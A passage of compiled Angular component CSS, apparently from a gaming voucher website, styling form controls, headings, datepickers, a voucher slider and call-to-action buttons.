        .form-control[_ngcontent-gtc-c10] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c10] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c10] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c10] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c10] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c10]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c10]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c10]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c10] h4[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10],
            .header-text-small[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c10] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c10] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c10] {
            float: left
        }

        .fright[_ngcontent-gtc-c10] {
            float: right
        }

        .row[_ngcontent-gtc-c10] .padding-left-0[_ngcontent-gtc-c10] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c10] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c10] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c10] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c10] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c10]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10]>.row[_ngcontent-gtc-c10] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] .shuffle-pop-table[_ngcontent-gtc-c10] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] .shuffle-pop-table[_ngcontent-gtc-c10] .shuffle-pop-item[_ngcontent-gtc-c10] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] .shuffle-pop-table[_ngcontent-gtc-c10] .shuffle-pop-item.img[_ngcontent-gtc-c10] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] p[_ngcontent-gtc-c10] strong[_ngcontent-gtc-c10] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c10] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c10] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c10]>.mat-calendar-body-cell-content[_ngcontent-gtc-c10]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c10],
        .mat-calendar-table-header[_ngcontent-gtc-c10] th[_ngcontent-gtc-c10],
        .mat-datepicker-content[_ngcontent-gtc-c10] .mat-calendar-next-button[_ngcontent-gtc-c10],
        .mat-datepicker-content[_ngcontent-gtc-c10] .mat-calendar-previous-button[_ngcontent-gtc-c10],
        .mat-datepicker-toggle[_ngcontent-gtc-c10],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c10] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c10] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c10] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c10] .mat-calendar-body-active[_ngcontent-gtc-c10]>.mat-calendar-body-cell-content[_ngcontent-gtc-c10]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c10] .mat-calendar-body-active[_ngcontent-gtc-c10]>.mat-calendar-body-cell-content[_ngcontent-gtc-c10]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c10]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c10]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c10]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c10] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c10] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c10] .mat-option.mat-selected[_ngcontent-gtc-c10]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c10] .mat-option[_ngcontent-gtc-c10] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] div[_ngcontent-gtc-c10],
        .ngx-editor-textarea[_ngcontent-gtc-c10] section[_ngcontent-gtc-c10] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] div[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10],
        .ngx-editor-textarea[_ngcontent-gtc-c10] section[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] a[_ngcontent-gtc-c10] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] *[_ngcontent-gtc-c10] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] b[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] b[_ngcontent-gtc-c10] *[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c10] td[_ngcontent-gtc-c10] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c10] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c10] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c10] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c10] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10] {
            width: 50px;
            opacity: .5
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] {
            background-color: #161619;
            background-repeat: no-repeat;
            background-size: cover;
            position: relative;
            padding: 40px 0;
            width: calc(100%)
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] header[_ngcontent-gtc-c10] {
            position: relative
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] {
            float: left
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
            position: relative;
            font-family: Montserrat-Semibold;
            font-size: 2.1em;
            font-weight: 600;
            color: #fff;
            padding-left: 30px
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10]::before {
            position: absolute;
            content: "";
            left: 0;
            top: 15px;
            height: 3px;
            width: 16px;
            background: #d0021b
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c10] {
                float: right
            }
            .fright[_ngcontent-gtc-c10] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c10] .shuffle-container[_ngcontent-gtc-c10] .shuffle-pop-table[_ngcontent-gtc-c10] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c10] button.mat-icon-button[_ngcontent-gtc-c10] {
                top: auto;
                bottom: 7px
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] {
                padding: 20px 0 0;
                width: calc(100%)
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .container[_ngcontent-gtc-c10] {
                padding-right: 0
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] {
                margin-bottom: 15px
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10] {
                font-size: 18px;
                padding-left: 25px
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-title[_ngcontent-gtc-c10] h3[_ngcontent-gtc-c10]::before {
                top: 7px;
                height: 3px;
                width: 12px
            }
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] {
            margin: 20px 10px 10px 0;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            float: right
        }

        @media (max-width:991px) {
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] {
                float: left;
                margin-bottom: 13px;
                top: 50%;
                right: 0;
                left: auto;
                margin-left: 20px
            }
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] a[_ngcontent-gtc-c10] {
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            text-decoration: none
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] a[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10] {
            position: relative;
            display: inline-block;
            height: 18px;
            width: 18px;
            margin: -4px 0 -4px 10px;
            background: #d0021b;
            overflow: hidden;
            border-radius: 3px
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] a[_ngcontent-gtc-c10] span[_ngcontent-gtc-c10]::after {
            position: absolute;
            font-family: FontAwesome;
            content: "\f105";
            right: 7px;
            top: 0
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more.hidden-md[_ngcontent-gtc-c10] {
            display: none
        }

        @media (max-width:767px) {
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more[_ngcontent-gtc-c10] {
                float: left;
                top: 50%;
                right: 0;
                left: auto;
                margin: 10px 10px 15px
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .header-more.hidden-md[_ngcontent-gtc-c10] {
                display: block
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .slick-slider .slick-list {
                padding: 0 20% 0 0 !important
            }
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] {
            margin: 0 0 20px -10px;
            outline: 0;
            position: relative
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .slick-slider .slick-arrow {
            width: 22px;
            height: 72px;
            position: absolute;
            top: 30%;
            outline: 0;
            border: none;
            border-radius: 4px;
            background-color: #d0021b;
            padding: 0;
            font-size: 0;
            background-repeat: no-repeat;
            background-image: url(/.assets/.images/.icons/right-arrow.png);
            background-size: 30%;
            background-position: center;
            cursor: pointer
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .slick-slider .slick-arrow.slick-prev {
            z-index: 2;
            left: 7px;
            transform: rotate(180deg)
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .slick-slider .slick-arrow.slick-next {
            right: 5px
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .slick-slider .slick-slide {
            margin-left: 0 !important
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] {
            padding: 8px
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] {
            cursor: pointer;
            display: block;
            height: 0;
            border-radius: 4px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 1px 8px rgba(0, 0, 0, .61)
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10]:focus {
            outline: 0
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .voucher-bg[_ngcontent-gtc-c10] {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            max-width: 100%;
            max-height: 100%;
            min-width: 100%;
            min-height: 100%;
            -o-object-fit: cover;
            object-fit: cover
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .bg-grayscale[_ngcontent-gtc-c10] {
            cursor: pointer;
            -moz-filter: grayscale(100%);
            -webkit-filter: grayscale(100%);
            filter: gray;
            filter: grayscale(100%)
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] {
            position: absolute;
            width: 100%;
            height: inherit;
            background-image: linear-gradient(to bottom, rgba(206, 199, 236, 0) 0, rgba(22, 21, 25, .1) 47%, #1a1a1a);
            padding: 10px;
            text-align: center;
            color: #fff
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10] {
            max-width: 60px;
            border-radius: 100%;
            position: absolute;
            bottom: 15px;
            left: 33%
        }

        @media (max-width:991px) {
            .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] {
                margin-left: 0
            }
            .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] img[_ngcontent-gtc-c10] {
                margin: 30px 0
            }
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] .d-small[_ngcontent-gtc-c10] {
            border: 0;
            padding: 0;
            margin: 0
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] small[_ngcontent-gtc-c10],
        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] strong[_ngcontent-gtc-c10] {
            display: block
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] strong[_ngcontent-gtc-c10] {
            font-family: Montserrat-Bold;
            font-weight: 400;
            font-size: 16px;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            max-width: 100%
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-item[_ngcontent-gtc-c10] .caption[_ngcontent-gtc-c10] small[_ngcontent-gtc-c10] {
            color: #6a707d
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-banner[_ngcontent-gtc-c10] {
            position: absolute;
            right: -25px;
            top: 14px;
            height: 25px;
            width: 100px;
            z-index: 2;
            font-size: 10px;
            text-align: center;
            background: #d0021b;
            transform: rotate(45deg)
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .voucher-banner[_ngcontent-gtc-c10] .banner-txt[_ngcontent-gtc-c10] {
            color: #fff;
            z-index: 2;
            position: relative;
            top: 4px;
            padding: 1px
        }

        .dgHome.game-voucher[_ngcontent-gtc-c10] .voucher-slider[_ngcontent-gtc-c10] .voucher-list[_ngcontent-gtc-c10] .title-voucher[_ngcontent-gtc-c10] {
            text-align: center;
            margin-top: 12px;
            font-size: 12px;
            color: #b4b4c0;
            font-family: Montserrat;
            font-weight: 600
        }
    </style>
    <style>
        .justify-content-left {
            justify-content: left !important
        }

        .justify-content-center {
            justify-content: center !important
        }

        .justify-content-right {
            justify-content: right !important
        }

        .justify-content-space-between {
            justify-content: space-between !important
        }

        .justify-content-flex-end {
            justify-content: flex-end !important
        }

        .text-decoration-line-through {
            text-decoration: line-through !important
        }

        .text-decoration-underline {
            text-decoration: underline !important
        }

        .text-decoration-overline {
            text-decoration: overline !important
        }

        .text-decoration-none {
            text-decoration: none !important
        }

        .align-self-center {
            align-self: center
        }

        .cursor-no-drop {
            cursor: no-drop !important
        }

        .cursor-pointer {
            cursor: pointer !important
        }

        .text-left {
            text-align: left !important
        }

        .text-center {
            text-align: center !important
        }

        .text-right {
            text-align: right !important
        }

        .text-justify {
            text-align: justify !important
        }

        .v-align-top {
            vertical-align: top !important
        }

        .v-align-middle {
            vertical-align: middle !important
        }

        .v-align-bottom {
            vertical-align: bottom !important
        }

        .float-left {
            float: left !important
        }

        .float-right {
            float: right !important
        }

        .mat-datepicker-toggle button.mat-icon-button {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper,
        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper svg.mat-datepicker-toggle-default-icon {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown {
            position: relative
        }

        .cust-dropdown i.fa-caret-down {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown input[type=text] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown .cust-option {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown .cust-option.active {
            display: block
        }

        .cust-dropdown .cust-option ul.option-list {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown .cust-option ul.option-list li {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown .cust-option ul.option-list li label {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown .cust-option ul.option-list li label:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li label:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio]:checked+label:after {
            opacity: 1
        }

        html {
            scroll-behavior: smooth
        }

        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a,
        label,
        ol li,
        table td,
        table th,
        ul li {
            font-family: Montserrat
        }

        b {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        p,
        span {
            margin: 0;
            font-family: Montserrat
        }

        button {
            outline: 0;
            font-family: Montserrat
        }

        input,
        textarea {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input {
                font-size: 11px
            }
        }

        label.label-media {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap p {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap p {
                font-size: .75em
            }
        }

        .close-circle-wrap p.close-circle {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap p.close-circle span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create span {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament span {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament p {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame p {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame {
                right: 10px
            }
            a.close-frame p {
                display: none
            }
        }

        a.close-frame span {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea {
            outline: 0;
            color: #fff;
